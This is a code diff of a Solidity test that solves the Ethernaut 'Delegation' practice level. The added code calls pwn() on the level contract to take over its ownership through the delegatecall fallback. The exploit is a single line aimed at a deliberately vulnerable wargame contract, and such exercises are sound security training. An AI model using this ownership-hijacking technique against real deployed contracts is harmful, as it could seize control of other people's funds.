@@ -7,16 +7,22 @@ import {Delegation} from "../src/levels/Delegation.sol";
 
 contract DelegationTest is EthernautTest {
     function setUp() public override {
-	super.setUp();
+        super.setUp();
         DelegationFactory factory = new DelegationFactory();
         ethernaut.registerLevel(factory);
         levelAddress = ethernaut.createLevelInstance(factory);
     }
 
     function testSolveDelegation() public {
-        Delegation instance = Delegation(payable(levelAddress));
+        // Delegation instance = Delegation(payable(levelAddress));
 
-	// insert your code here!
+        // [START]
+
+        (bool success, ) = levelAddress.call(abi.encodeWithSignature("pwn()"));
+
+        require(success);
+
+        // [END]
 
         assert(ethernaut.submitLevelInstance(payable(levelAddress)));
     }
